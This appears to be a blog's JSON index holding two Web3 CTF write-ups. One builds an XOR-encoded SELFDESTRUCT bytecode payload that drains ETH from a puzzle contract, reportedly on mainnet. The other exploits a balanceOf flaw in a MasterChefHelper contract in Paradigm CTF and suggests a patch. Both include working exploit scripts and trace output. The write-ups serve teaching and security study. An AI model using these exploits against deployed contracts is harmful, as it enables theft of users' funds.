\u003e STORAGE[msg.sender] At that point, we got a problem because 4095+block.timestamp will be greater than block.timestamp. STORAGE_[msg.sender] = 4095+block.timestamp; This will be really awfull… As the block.timestamp will not change during the same transaction… How could we bypass this check? Patience… we have to wait 4095 seconds before calling again the contract. Obviously, for debugging purposes we can use cheatcode from Foundry like vm.warp(): vm.warp(4096+block.timestamp)to jump in the future of 4096 seconds. ","date":"2022-12-30","objectID":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/:0:2","tags":["PoC","EVM","LOW-LEVEL","REVERSE ENGINEERING","SELFDESTRUCT"],"title":"Challenge Twitter - EVM Puzzles \u0026 selfdestruct","uri":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/"},{"categories":["Web3"],"content":"3. Bytecode We are now bypassing everything! We arriving at the interesting part. henceforth we need to craft our malicious contract to steal the ETH during the delegateCall(). The “base” of the evm bytecode is already made for us here: MEM[0] = (msg.data.length \u003c\u003c 232) + 0x61000080600a3d393df300000000000000000000000000000000000000000000; //The \"base\" evm is then : 0x61000080600a3d393df300000000000000000000000000000000000000000000 We got the 0xF3 at the end (stands for RETURN), so if somehow we succeed to inject the malicious bytecode after the 0xf3(RETURN). We will be rich as yannickcrypto.eth!🚀 The msg.data is used to determine the length of our contract code. So for example, if the length is 30 bytes the contract deployed will be of 30 bytes. So just to recap, we have to use the msg.data. To use it, we will use a bytes memory using the hex keyword (e.g below). bytes memory data = hex\"4141414141414141414141414141414141414141\"; // send 20 bytes. victim.call{ gas: 1_000_000 }(data); So this the layout we have right now: 20 bytes (Base) |------------------| 61000080600a3d393df300000000000000000000000000000000000000000000 ^ This is the layout we want: 20 bytes (Base) bytes malicious to create a selfdestruct |------------------|-------------------------------------------| 61000080600a3d393df300000000000000000000000000000000000000000000 ^ The CALLDATACOPY is used to copy the data into the memory here (all the data is copied). evm.codes CALLDATACOPY So this will copy the data to the offset 10. (e.g : screenshots \u0026 explanation below). Before CALLDATACOPY this is what looks like the memory. Forge Debugger before the CallDataCopy After CALLDATACOPY here the size is 0x20 because the real payload is 32 bytes (0x20 = 32). Forge Debugger after the CallDataCopy Now, we have to dive into the weird math operation… Here, I was confused with the output of the decompiler. But lucky for me, I was already familiar with this kind of xor pattern → Reversing \u0026 crackme on x86 (PleaseSubscribe). v1 = v2 = 1 + (msg.data.length - 1 \u003e\u003e 5); do { MEM[10 + (v2 - v1 \u003c\u003c 5)] = (msg.sender | msg.sender \u003c\u003c 160) ^ MEM[10 + (v2 - v1 \u003c\u003c 5)]; v1 = v1 - 1; } while (!v1); So I guessed it.. was a xor byte per byte operation by the pattern. We will use the foundry debugger to confirm. First, we need to generate some values to prove it. Let’s use python here: Generating 0x41 on 32 bytes Now, we can add the value using the hex as previous. bytes memory data = hex\"4141414141414141414141414141414141414141414141414141414141414141\"; // hexadecimal string victim.call{ gas: 1_000_000 }(data); And now, if we move to the xor operation with the foundry debugger. Foundry Debugger showing the XOR operation This is the case!!And now, we need to use the right opcodes to not revert and execute a full self-destruct on our address to getback the ETH ","date":"2022-12-30","objectID":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/:0:3","tags":["PoC","EVM","LOW-LEVEL","REVERSE ENGINEERING","SELFDESTRUCT"],"title":"Challenge Twitter - EVM Puzzles \u0026 selfdestruct","uri":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/"},{"categories":["Web3"],"content":"4. SELFDESTRUCT SELFDESTRUCT SELFDESTRUCT will destroy and send all the ETH to a arbitrary address. The SELFDESTRUCT opcode is 0xFF. Let’s use evm.codes to know how to use SELFDESTRUCT ⬇️ evm.codes SELFDESTRUCT So our plan, will be : 1 - PUSH our address on the stack. 2 - Call the SELFDESTRUCT. 3 - Call STOP to stop the execution? Ok, we need to push our address using PUSH20 for 20 bytes (because addresses are in uint160). So, it will looks like something like: EVM Playground our malicious opcode PUSH20(0x5b73c5498c1e3b4dba84de0f1833c4a029d90519) | 0xF3 SELFDESTRUCT() | 0xFF STOP | 0x00 The final payload is: 735b73c5498c1e3b4dba84de0f1833c4a029d90519FF00 Now we have the payload we need to make win the challenge! However, we have to reminder the xor operation! So using python one last time we can xor our payload with the key. \u003e\u003e\u003e hex(0xba84de0f1833c4a029d905195b73c5498c1e3b4dba84de ^ 0x735b73c5498c1e3b4dba84de0f1833c4a029d90519FF00) '0xc9dfadca51bfda9b646381c7546bf68d2c37e248a37bde' And we got our final payload!!! 0xc9dfadca51bfda9b646381c7546bf68d2c37e248a37bde Let’s execute this one into on ETH mainnet! ","date":"2022-12-30","objectID":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/:0:4","tags":["PoC","EVM","LOW-LEVEL","REVERSE ENGINEERING","SELFDESTRUCT"],"title":"Challenge Twitter - EVM Puzzles \u0026 selfdestruct","uri":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/"},{"categories":["Web3"],"content":"5. Proof of Concept \u0026 Results Traces: [112757] CounterScript::run() ├─ [0] VM::deal(CounterScript: [0x5b73C5498c1E3b4dbA84de0F1833c4a029d90519], 1000000000000000000) │ └─ ← () ├─ emit log_string(: ----------------------- Before Attack ----------------------------------) ├─ emit log_named_uint(key: Balance of the contract, val: 1000000000000000000) ├─ emit log_named_uint(key: Balance of the victim, val: 100000000000000000) ├─ [22173] 0xA0Eb20483Cb60213bF944c2C3833bebc9fbc4706::fallback{value: 100000000000000000}() │ └─ ← () ├─ [0] VM::warp(1672353711) │ └─ ← () ├─ [43904] 0xA0Eb20483Cb60213bF944c2C3833bebc9fbc4706::c9dfadca(51bfda9b646381c7546bf68d2c37e248a37bde0f1833c4a029d90519) │ ├─ [6422] → new \u003cUnknown\u003e@0x37a9B80AcC6A434d4E29D8873BaB9E471cb0d244 │ │ └─ ← 32 bytes of code │ ├─ [5003] 0x37a9B80AcC6A434d4E29D8873BaB9E471cb0d244::fallback() [delegatecall] │ │ └─ ← () │ └─ ← () ├─ emit log_string(: ----------------------- After Attack ----------------------------------) ├─ emit log_named_uint(key: Balance of the contract, val: 1100000000000000000) ├─ emit log_named_uint(key: Balance of the victim, val: 0) └─ ← () Script ran successfully. == Logs == ----------------------- Before Attack ---------------------------------- Balance of the contract: 1000000000000000000 Balance of the victim: 100000000000000000 ----------------------- After Attack ---------------------------------- Balance of the victim: 0 Voila! The victim contract is now holding 0 ETH! We drained all the eth from the contract :) Don’t hesitate to join us on discord, we are building a InfoSec web3 community 🔥 with CTFs. ","date":"2022-12-30","objectID":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/:0:5","tags":["PoC","EVM","LOW-LEVEL","REVERSE ENGINEERING","SELFDESTRUCT"],"title":"Challenge Twitter - EVM Puzzles \u0026 selfdestruct","uri":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/"},{"categories":["Web3"],"content":"6. Socials \u0026 Payload Discord (Join us!) Github Twitter https://discord.gg/54Q9pnpQcV https://github.com/Ethnical/Swek3 https://twitter.com/EthnicalInfo The payload used not _clean (yet)_: ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \"forge-std/Script.sol\"; import \"forge-std/Test.sol\"; contract CounterScript is Script, Test { function setUp() public {} function run() public { vm.deal(address(this), 1 ether); address victim = 0xA0Eb20483Cb60213bF944c2C3833bebc9fbc4706; string memory victim_addr = \"\"; emit log_string(\" ----------------------- Before Attack ----------------------------------\"); emit log_named_uint(\"Balance of the contract\", address(this).balance); emit log_named_uint(\"Balance of the victim\", address(victim).balance); bytes memory data = hex\"c9dfadca51bfda9b646381c7546bf68d2c37e248a37bde0f1833c4a029d90519\"; // hexadecimal payload xored. victim.call{ value: 0.1 ether }(\"\"); vm.warp(block.timestamp + 10000); victim.call{ gas: 1_000_000 }(data); emit log_string(\" ----------------------- After Attack ----------------------------------\"); emit log_named_uint(\"Balance of the contract\", address(this).balance); emit log_named_uint(\"Balance of the victim\", address(victim).balance); } } Challenge Code EVM codes for retrying the challenge! **0x4861707079204e65772059656172204576657279626f647921212121212121346100ab573354803d1090421116610034573d3dfd5b69414e65f7405358584fd360801b1860801c60b01b3660e81b016000525a600a3601363d600a373360a01b331760206001360304600101805b808203602002600a01805184189052600190038061006d575050503d3df03d808080936100a0566920434f4e475241545a205b636861645d95f43d3df35b426363b0beef036469696969690234116100c3573d3dfd5b42610fff0133553d3df3** ","date":"2022-12-30","objectID":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/:0:6","tags":["PoC","EVM","LOW-LEVEL","REVERSE ENGINEERING","SELFDESTRUCT"],"title":"Challenge Twitter - EVM Puzzles \u0026 selfdestruct","uri":"/posts/twitterchallenge-puzzle-bytecode-f31ba85c800f4c42a469490f9c2378c0/"},{"categories":["Web3"],"content":"I accidentally sent some WETH to a contract, can you help me?","date":"2022-12-01","objectID":"/posts/paradigmctf-/","tags":["CTF","DEFI","UNISWAP"],"title":"Paradigm CTF - Rescue","uri":"/posts/paradigmctf-/"},{"categories":["Web3"],"content":" I accidentally sent some WETH to a contract, can you help me? Here, we have 3 files here MasterChefHelper.sol Setup.sol UniswapV2Like.sol The vulnerable contract is MasterChefHelper.sol (UniswapV2Like.sol is useless here). First, The Setup.sol contract is creating the CTF, the contract is creating a vulnerable fork of a MasterChef (from Sushi). Then we can see the whoops comment in the code below, because the admin sent 10 weth at the wrong address… So we have to steal the 10 weth from the MasterChefHelper. // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import './MasterChefHelper.sol'; interface WETH9 is ERC20Like { function deposit() external payable; function withdraw(uint256) external; } contract Setup { WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); MasterChefHelper public immutable mcHelper; constructor() payable { mcHelper = new MasterChefHelper(); weth.deposit{value: 10 ether}(); weth.transfer(address(mcHelper), 10 ether); // whoops } function isSolved() external view returns (bool) { return weth.balanceOf(address(mcHelper)) == 0; } } Let’s dive into the code of MasterChefHelper.sol // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.16; import \"./UniswapV2Like.sol\"; interface ERC20Like { function transferFrom(address, address, uint) external; function transfer(address, uint) external; function approve(address, uint) external; function balanceOf(address) external view returns (uint); } interface MasterChefLike { function poolInfo(uint256 id) external returns ( address lpToken, uint256 allocPoint, uint256 lastRewardBlock, uint256 accSushiPerShare ); } contract MasterChefHelper { MasterChefLike public constant masterchef = MasterChefLike(0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd); UniswapV2RouterLike public constant router = UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F); function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external { (address lpToken,,,) = masterchef.poolInfo(poolId); address tokenOut0 = UniswapV2PairLike(lpToken).token0(); address tokenOut1 = UniswapV2PairLike(lpToken).token1(); ERC20Like(tokenIn).approve(address(router), type(uint256).max); ERC20Like(tokenOut0).approve(address(router), type(uint256).max); ERC20Like(tokenOut1).approve(address(router), type(uint256).max); ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn); // swap for both tokens of the lp pool _swap(tokenIn, tokenOut0, amountIn / 2); _swap(tokenIn, tokenOut1, amountIn / 2); // add liquidity and give lp tokens to msg.sender _addLiquidity(tokenOut0, tokenOut1, minAmountOut); } function _addLiquidity(address token0, address token1, uint256 minAmountOut) internal { (,, uint256 amountOut) = router.addLiquidity( token0, token1, ERC20Like(token0).balanceOf(address(this)), ERC20Like(token1).balanceOf(address(this)), 0, 0, msg.sender, block.timestamp ); require(amountOut \u003e= minAmountOut); } function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal { address[] memory path = new address[](2); path[0] = tokenIn; path[1] = tokenOut; router.swapExactTokensForTokens( amountIn, 0, path, address(this), block.timestamp ); } } ","date":"2022-12-01","objectID":"/posts/paradigmctf-/:0:0","tags":["CTF","DEFI","UNISWAP"],"title":"Paradigm CTF - Rescue","uri":"/posts/paradigmctf-/"},{"categories":["Web3"],"content":"1. What the contract does? ","date":"2022-12-01","objectID":"/posts/paradigmctf-/:1:0","tags":["CTF","DEFI","UNISWAP"],"title":"Paradigm CTF - Rescue","uri":"/posts/paradigmctf-/"},{"categories":["Web3"],"content":"The function swapTokenForPoolToken This is the function, we will use to the steal the 10 weth from the MasterChefHelper. function swapTokenForPoolToken(uint256 poolId, address tokenIn, uint256 amountIn, uint256 minAmountOut) external { (address lpToken,,,) = masterchef.poolInfo(poolId); // get the LPaddress from the poolInfo address tokenOut0 = UniswapV2PairLike(lpToken).token0(); //get the token0 of the pool address tokenOut1 = UniswapV2PairLike(lpToken).token1(); //get the token0 of the pool ERC20Like(tokenIn).approve(address(router), type(uint256).max); ERC20Like(tokenOut0).approve(address(router), type(uint256).max); ERC20Like(tokenOut1).approve(address(router), type(uint256).max); ERC20Like(tokenIn).transferFrom(msg.sender, address(this), amountIn); //Tranfer the tokenIn to the masterchef // swap for both tokens of the lp pool _swap(tokenIn, tokenOut0, amountIn / 2); //swap half of the amount _swap(tokenIn, tokenOut1, amountIn / 2); //swap half of the amount // add liquidity and give lp tokens to msg.sender _addLiquidity(tokenOut0, tokenOut1, minAmountOut); } So this function swap our tokenIn (for example USDC to token0 \u0026 token1 of the Liquidity Pool given into poolId). Then will make a Liquidity Pool Token (LP) from token1 and token0 and sending back to msg.sender. This is really similar to the Zap method from StellaSwap on Moonbeam 😎 Zap feature (from Stellaswap a DeFi Protocol). But in our CTF, we cannot swap identical tokens (for example, if tokenIn is USDC the pool has to be something that doesn’t contain any USDC inside otherwise the _swap(tokenIn, tokenOut1, amountIn / 2); will revert with the message IDENTICAL SWAP TOKEN. So this pool will work DAI/WETH but USDC/WETH will revert. So now we understood that, our attack goal will be to trigger _addLiquidity(tokenOut0, tokenOut1, minAmountOut); with token0 DAI and token1 WETH to get the 10 WETH inside the contract. function _addLiquidity( address token0, address token1, uint256 minAmountOut ) internal { (, , uint256 amountOut) = router.addLiquidity(token0, token1, ERC20Like(token0).balanceOf(address(this)), ERC20Like(token1).balanceOf(address(this)), 0, 0, msg.sender, block.timestamp); require(amountOut \u003e= minAmountOut, 'minAmoun to slow'); } The vulnerability is here because the MasterChefHelper is using ERC20Like(token1).balanceOf(address(this)) \u0026 ERC20Like(token0).balanceOf(address(this)). A check on the swap return value should be implemented here! //Eexplanation code uint256 realvalue0 = _swap(tokenIn, tokenOut0, amountIn / 2); uint256 realvalue1 = _swap(tokenIn, tokenOut1, amountIn / 2); // DO NOT USE IN PROD (, , uint256 amountOut) = router.addLiquidity(token0, token1, ERC20Like(token0).balanceOf(address(this)), ERC20Like(token1).balanceOf(address(this)), 0, 0, msg.sender, block.timestamp); // Patch version (, , uint256 amountOut) = router.addLiquidity(token0, token1, realvalue0, realvalue1, 0, 0, msg.sender, block.timestamp); Using BalanceOf(address(this))is dangerous here because if you have enough token0 or token1 then the pool will be created and sent back the msg.sender. Now, we know that we have to swap some WETH to USDC and find a pool that doesn’t contain USDC inside but WETH is mandatory (as we said before we will choose DAI/WETH). Perfect! the pool number 2 match exactly what we need : Etherscan PoolInfo DAI/WETH address If we just call the swapTokenForPoolToken() with some USDC it will just create a “normal” LP with USDC/2 ⇒ token0 \u0026 USDC/2 ⇒ token1. And you cannot withdraw the 10 WETH. But the trick here is to send more DAI to MasterChefHelper directly. So as we said last time MasterChefHelper will use ERC20Like(token0).balanceOf(address(this)) and create a pool with the total value and sending back to you 😉 Then the pool will be empty! We then just has to flag the challenge using netcat! Using netcat to get the flag! ","date":"2022-12-01","objectID":"/posts/paradigmctf-/:1:1","tags":["CTF","DEFI","UNISWAP"],"title":"Paradigm CTF - Rescue","uri":"/posts/paradigmctf-/"},{"categories":["Web3"],"content":"Socials \u0026 Payload Discord (Join us!) Github Twitter https://discord.gg/54Q9pnpQcV https://github.com/Ethnical/Swek3 https://twitter.com/EthnicalInfo // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; //import 'forge-std/Script.sol'; import 'src/Setup.sol'; //import 'forge-std/Test.sol'; contract ContractScript { function setUp() public {} function run() public payable { Setup s = Setup(0x8ceB77a963474dbA300421fc8E8F91831C776dC3); MasterChefHelper M = s.mcHelper(); MasterChefLike ML = M.masterchef(); WETH9 wet = s.weth(); uint256 max = type(uint256).max; //echo \"1\\nd85d44b338644cda1cbad7a66918f61ca5356c9f589be69b2a62eb\\n\" | nc 34.123.187.206 31337 //vm.deal(address(this), 5000 ether); //vm.addr(0xb746dd73a823761682724bcf5f06360680943e14a2e2a212c111c2a0dd469090); wet.deposit{value: 1000 ether}(); address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F; address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; address[] memory path = new address[](2); path[0] = address(wet); path[1] = address(dai); address[] memory path2 = new address[](2); path2[0] = address(wet); path2[1] = address(usdc); wet.approve(address(M.router()), 10000 ether); //Approve router //wet.approve(0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f, 10000 ether); //approve pool ERC20Like(dai).approve(address(M), 100000000000 ether); ERC20Like(usdc).approve(address(M), 100000000000 ether); M.router().swapExactTokensForTokens(500 ether, 100_000 ether, path, address(this), 10 ether); //Swap WETH TO DAI M.router().swapExactTokensForTokens(500 ether, 100_000 * 10**6, path2, address(this), 10 ether); //Swap WETH TO DAI M.swapTokenForPoolToken(2, address(usdc), 10_000 * 10**6, 10 ether); ERC20Like(dai).transfer(address(M), 35_000 ether); M.swapTokenForPoolToken(2, address(usdc), 100, 100); //M.swapTokenForPoolToken(2, address(usdc), 100, 100); //M.swapTokenForPoolToken(2, address(usdc), 100, 100); //M.swapTokenForPoolToken(0, address(usdc), 1, 1 * 10**6); //M.router().swapExactTokensForTokens(500 ether, 1 ether, path2, address(this), max); //Swap WETH TO USDC } fallback() external payable {} } ","date":"2022-12-01","objectID":"/posts/paradigmctf-/:1:2","tags":["CTF","DEFI","UNISWAP"],"title":"Paradigm CTF - Rescue","uri":"/posts/paradigmctf-/"}]